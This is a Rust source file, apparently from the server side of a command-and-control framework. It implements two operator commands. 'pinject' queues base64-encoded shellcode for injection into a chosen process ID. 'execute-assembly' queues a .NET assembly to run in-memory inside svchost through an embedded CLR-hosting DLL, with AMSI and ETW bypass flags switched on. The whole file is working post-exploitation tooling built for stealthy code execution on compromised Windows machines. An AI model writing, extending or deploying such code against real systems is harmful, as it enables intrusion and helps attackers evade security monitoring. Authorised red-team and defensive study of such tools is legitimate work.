use server::links::Links;
use actix_web::web;

// internal packages
use crate::server;

pub fn process_inject(links: web::Data<Links>, link_index: usize, command: Vec<String>) {
    if command.len() < 3 {
        println!("pinject <pid> <path-to-shellcode>\n   eg: pinject 1307 /tmp/shellcode.bin");
        return
    }
    let shellcode = match std::fs::read(command[2].clone()) {
        Err(e)          => { println!("{}", e); return },
        Ok(shellcode)   => shellcode,
    };
    let shellcode_b64 = base64::encode(shellcode);
    let mut updated_command = command.clone();
    updated_command[2] = shellcode_b64;
    links.links.lock().unwrap()[link_index].set_command(updated_command.join(" "), command.join(" "));
}

pub fn execute_assembly(links: web::Data<Links>, link_index: usize, command: Vec<String>) {
    if command.len() < 3 {
        println!("execute-assembly <path-to-assembly> <parameters>\n    eg: execute-assembly /tmp/SharpTool.exe -all");
        return
    }
    // 0 name
    let mut updated_command: Vec<String> = Vec::new();
    updated_command.push(command[0].clone());
    // 1 assembly
    let assembly = match std::fs::read(command[1].clone()) {
        Err(e)         => { println!("{}", e); return },
        Ok(assembly)   => assembly,
    };
    let assembly_b64 = base64::encode(assembly);
    updated_command.push(assembly_b64);
    // 2 hostingdll
    let hostingclr_dll = include_bytes!("../assets/HostingCLRx64.dll");
    let hostingclr_dll_b64 = base64::encode(hostingclr_dll);
    updated_command.push(hostingclr_dll_b64);
    // 3 process
    updated_command.push("svchost".to_string());
    // 4 amsi bool
    updated_command.push("true".to_string());
    // 5 etw bool
    updated_command.push("true".to_string());
    // 6 parameters
    updated_command.extend_from_slice(&command[2..]);
    links.links.lock().unwrap()[link_index].set_command(updated_command.join(" "), command.join(" "));
}

